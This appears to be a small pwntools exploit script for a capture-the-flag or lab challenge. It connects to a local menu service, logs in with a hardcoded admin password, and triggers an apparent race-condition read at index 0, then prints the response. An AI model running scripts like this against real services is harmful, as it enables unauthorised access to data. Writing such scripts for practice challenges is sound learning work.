from pwn import *
import time

context.log_level = "error"

# LOCAL TEST
p = remote("localhost", 1337)

def admin_login():
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"password: ", b"supersecret")

def race_read():
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", b"0")
    time.sleep(0.001)

admin_login()
race_read()

print(p.recvall(timeout=2).decode(errors="ignore"))
